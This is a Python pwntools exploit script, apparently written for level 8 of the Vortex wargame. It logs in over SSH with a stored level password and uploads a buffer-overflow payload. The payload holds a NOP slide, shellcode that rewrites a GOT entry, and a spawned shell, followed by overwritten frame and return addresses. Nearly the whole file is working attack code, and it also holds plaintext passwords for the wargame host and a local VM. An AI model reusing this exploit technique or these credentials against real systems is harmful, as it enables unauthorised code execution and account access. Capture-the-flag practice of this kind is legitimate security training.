from pwn import *
from random import randint
from time import sleep


local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
LOCAL = None

def pad(s, slen):
    return s+b"B"*(slen-len(s))

def connect(level, password,init=False):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global LOCAL
    compose_downloaded_files(level)
    port = 2228
    connected = False
    s = None
    while not connected:
        try:
            s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
            connected = True
            log.info("connected")
            if init:
                s.libs(remote_binary, local_dir)
        except Exception as e:
            log.info("ssh connection attempt failed")
            print("error: {0}".format(e))
            sleep(randint(1, 5))
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


def pad(s, slen):
    return s+b"B"*(slen-len(s))


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global LOCAL
    global BINARY_PATH
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/6/"
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    s.process(["chmod", "a+x", BINARY_PATH])
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"


# s = connect_to_vm("8", "X70A_gcgl", remote=False)
s = connect("8", "X70A_gcgl")

vortex_9_uid = 5009
alpha = string.ascii_lowercase
sleep_plt = 0x80484e0
flush_got = 0x804a010

buf_size = 1032

log.info("############################################################################################################################################################")
log.info("# FIND OFFSET TO RET ADR")
log.info("############################################################################################################################################################")


# payload = b""
# payload += b"A"*buf_size
# payload += bytes(alpha, "utf-8")

# write("/tmp/docgil", payload)
# s.upload("/tmp/docgil", "/tmp/docgil")
#
# s.process([BINARY_PATH, payload])
# 68676665

log.info("############################################################################################################################################################")
log.info("# REDIRECT CODE EXECUTION")
log.info("############################################################################################################################################################")

# first 8 bytes is buf shellcode adr
nopslide_bytes = 650
buf_adr = 0xffffd5f0
saved_bp = 0xffffda28
buf_shellcode_adr = buf_adr + nopslide_bytes + 100

log.info("buf_adr: " + hex(buf_adr))
log.info("buf_shellcode_adr: " + hex(buf_shellcode_adr))


off_until_ret = 4

payload = b""
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.nop()) * nopslide_bytes)
# change got of flush to jump right after this code
# memcpy is broke use diff method
# payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.memcpy(flush_got, buf_adr, 1)))

payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('edi', 'esp')))
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('esp', flush_got)))
# mov    DWORD PTR [esp],value
payload += b"\xc7\x04\x24" + pack(buf_shellcode_adr, 32)
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.mov('esp', 'edi')))

payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.infloop()))
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.nop()) * 150)

# payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.linux.cat("/etc/vortex_pass/vortex9")))
payload += pwnlib.encoders.encoder.null(asm(pwnlib.shellcraft.i386.sh()))


payload = pad(payload, buf_size)
# payload += b"C"*off_until_ret
payload += pack(saved_bp, 32)
payload += pack(buf_adr + nopslide_bytes, 32)

log.info(f"payload len: {len(payload)}")


write("/tmp/docgil", payload)
s.upload("/tmp/docgil", "/tmp/docgil")

io = s.process(["env", "-i", BINARY_PATH, payload])
io.interactive()

# ci41)GJhb



